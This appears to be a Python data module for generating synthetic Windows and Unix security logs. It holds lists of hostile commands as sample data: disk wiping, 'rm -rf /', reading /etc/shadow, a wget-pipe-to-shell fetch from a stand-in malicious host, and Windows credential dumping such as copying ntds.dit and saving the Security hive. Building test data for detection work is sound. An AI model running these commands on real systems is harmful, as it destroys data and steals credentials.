OS_LIST = [
    "AIX_7.2",
    "HP-UX_11i_v3",
    "Solaris_11",
    "FreeBSD_13.2",
    "OpenBSD_7.4",
    "NetBSD_10.0",
    "Ubuntu_22.04_LTS",
    "Red_Hat_Enterprise_Linux_9",
    "CentOS_8",
    "Debian_12",
    "Fedora_38",
    "Arch_Linux_2024.09",
    "Kali_Linux_2024.1",
    "Alpine_Linux_3.18",
    "SUSE_Linux_Enterprise_Server_15_SP4",
    "Windows_10_Pro",
    "Windows_11_Home",
    "Windows_Server_2019",
    "Windows_Server_2022",
    "Windows_8.1",
    "Windows_7_SP1",
    "macOS_Ventura_13",
    "macOS_Monterey_12",
    "macOS_Big_Sur_11",
    "macOS_Catalina_10.15",
    "macOS_Mojave_10.14",
    "iOS_17",
    "iPadOS_17",
    "Android_14",
    "HarmonyOS_3.1"
]
UNIX_CMD = [
    "cat /etc/shadow",
    "dd if=/dev/zero of=/dev/sda",
    "rm -rf /",
    "find / -name '*.log' -exec rm -f {} \\;",
    "wget -O- http://malicious.example.com/malware | sh",
    "iptables -F",
    "chmod -R 777 /",
    "chown -R nobody:nogroup /"
]
UNIX_CMD = [
    "cat /etc/shadow",
    "dd if=/dev/zero of=/dev/sda",
    "rm -rf /",
    "find / -name '*.log' -exec rm -f {} \\;",
    "wget -O- http://malicious.example.com/malware | sh",
    "iptables -F",
    "chmod -R 777 /",
    "chown -R nobody:nogroup /"
]
WINDOWS_CMD = [
    "net localgroup", "net user", "Get-LocalUser", "Get-LocalGroup",
    "rundll32.exe vaultcli.dll,VaultEnumerateVaults 0,%TEMP%\\vaultList.txt",
    "Import-Module DSInternals; Get-CachedDomainCredential",
    "Import-Module DSInternals; Get-SamDomainInformation",
    "Import-Module PowerSploit; Invoke-NinjaCopy -Path 'C:\\Windows\\NTDS\\ntds.dit' "
    "-Destination 'C:\\temp\\ntds.dit'",
    "Import-Module PowerShellVault; Get-VaultCredential",
    "reg.exe save HKLM\\Security %TEMP%\\security.hive",
    "Import-Module DSInternals; Get-WinSystemKey",
    "wmic.exe /namespace:\\root\\cimv2 path Win32_Account",
    "Import-Module PowerSploit; Get-GPPPassword"
]
WIN_PROCESSES = ["explorer.exe", "svchost.exe", "services.exe", "lsass.exe", "smss.exe", "csrss.exe", "wininit.exe",
                 "winlogon.exe", "taskhostw.exe", "conhost.exe", "dwm.exe", "wuauclt.exe", "SearchIndexer.exe",
                 "spoolsv.exe", "taskmgr.exe", "regedit.exe", "mmc.exe", "rundll32.exe", "dllhost.exe"]
WIN_EVENTS = [
    '<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">'
    '<System><Provider Name="Microsoft-Windows-Sysmon" Guid="{guid}"/>'
    '<EventID>10</EventID><Version>5</Version><Level>4</Level><Task>10</Task><Opcode>0</Opcode>'
    '<Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime="{system_time}"/>'
    '<EventRecordID>{event_record_id}</EventRecordID><Correlation/>'
    '<Execution ProcessID="{process_id}" '
    'ThreadID="{thread_id}" Channel="Microsoft-Windows-Sysmon/Operational"/><Computer>{src_host}</Computer>'
    '<EventData><Data Name="TargetImage">C:\\Windows\\System32\\calc.exe</Data>'
    '<Data Name="TargetPID">{target_pid}</Data></EventData></Event>',

    '<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">'
    '<System><Provider Name="Microsoft-Windows-Security-Auditing" Guid="{guid}"/>'
    '<EventID>4672</EventID><Version>0</Version><Level>0</Level><Task>12544</Task><Opcode>0</Opcode>'
    '<Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="{system_time}"/>'
    '<EventRecordID>{event_record_id}</EventRecordID><Correlation/>'
    '<Execution ProcessID="{process_id}" '
    'ThreadID="{thread_id}" Channel="Security"/><Computer>{src_host}</Computer>'
    '<Security UserID="{user}"/>'
    '<EventData><Data Name="SubjectUserSid">{user}</Data>'
    '<Data Name="SubjectUserName">{user}</Data>'
    '<Data Name="SubjectDomainName">{src_domain}</Data>'
    '<Data Name="SubjectLogonId">{subject_login_id}</Data>'
    '<Data Name="PrivilegeList">{privilege_list}</Data></EventData></Event>',

    '<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">'
    '<System><Provider Name="Microsoft-Windows-Security-Auditing" Guid="{guid}"/>'
    '<EventID>4648</EventID><Version>0</Version><Level>0</Level><Task>13824</Task><Opcode>0</Opcode>'
    '<Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="{system_time}"/>'
    '<EventRecordID>{event_record_id}</EventRecordID><Correlation/><Execution ProcessID="'
    '{process_id}" '
    'ThreadID="{thread_id}" Channel="Security"/><Computer>{src_host}</Computer>'
    '<Security UserID="{user}"/>'
    '<EventData><Data Name="SubjectUserSid">{user}</Data><Data Name="SubjectUserName">'
    '{user}</Data>'
    '<Data Name="SubjectDomainName">{src_domain}</Data><Data Name="SubjectLogonId">'
    '{user}</Data>'
    '<Data Name="NewProcessId">{new_process_id}</Data><Data Name="ProcessId">{process_id}</Data>'
    '<Data Name="CommandLine">{win_cmd}</Data><Data Name="TargetUserSid">{user}</Data>'
    '<Data Name="TargetUserName">{user}</Data><Data Name="TargetDomainName">'
    '{src_domain}</Data>'
    '<Data Name="TargetLogonId">{user}</Data><Data Name="LogonType">3</Data></EventData></Event>',

    '<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">'
    '<System><Provider Name="Microsoft-Windows-Security-Auditing" Guid="{guid}"/>'
    '<EventID>4624</EventID><Version>0</Version><Level>0</Level><Task>12544</Task><Opcode>0</Opcode>'
    '<Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="{system_time}"/>'
    '<EventRecordID>{event_record_id}</EventRecordID><Correlation/>'
    '<Execution ProcessID="{process_id}" '
    'ThreadID="{thread_id}" Channel="Security"/><Computer>{src_host}</Computer>'
    '<Security UserID="{user}"/><EventData><Data Name="SubjectUserSid">{user}</Data>'
    '<Data Name="SubjectUserName">{user}</Data>'
    '<Data Name="SubjectDomainName">{src_domain}</Data><Data Name="SubjectLogonId">{user}</Data>'
    '<Data Name="LogonType">3</Data><Data Name="TargetUserSid">{user}</Data>'
    '<Data Name="TargetUserName">{user}</Data>'
    '<Data Name="TargetDomainName">{src_domain}</Data>'
    '<Data Name="ProcessName">{win_process}</Data><Data Name="ProcessId">{process_id}</Data>'
    '<Data Name="DestinationLogonId">{destination_login_id}</Data>'
    '<Data Name="SourceNetworkAddress">{source_network_address}</Data>'
    '<Data Name="SourcePort">{local_port}</Data><Data Name="LogonGuid">{guid}</Data>'
    '<Data Name="TransmittedServices">{transmitted_services}</Data></EventData></Event>',

    '<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">'
    '<System><Provider Name="Microsoft-Windows-Security-Auditing" Guid="{guid}"/>'
    '<EventID>4688</EventID><Version>0</Version><Level>0</Level><Task>13312</Task><Opcode>0</Opcode>'
    '<Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="{system_time}"/>'
    '<EventRecordID>{event_record_id}</EventRecordID><Correlation/>'
    '<Execution ProcessID="{process_id}" '
    'ThreadID="{thread_id}" Channel="Security"/><Computer>{src_host}</Computer>'
    '<Security UserID="{user}"/>'
    '<EventData><Data Name="SubjectUserSid">{user}</Data>'
    '<Data Name="SubjectUserName">{user}</Data>'
    '<Data Name="SubjectDomainName">{src_domain}</Data><Data Name="SubjectLogonId">{user}</Data>'
    '<Data Name="NewProcessId">{new_process_id}</Data>'
    '<Data Name="CreatorProcessId">{process_id}</Data>'
    '<Data Name="TokenElevationType">TokenElevationTypeLimited (3)</Data>'
    '<Data Name="ProcessCommandLine">{win_cmd}</Data>'
]
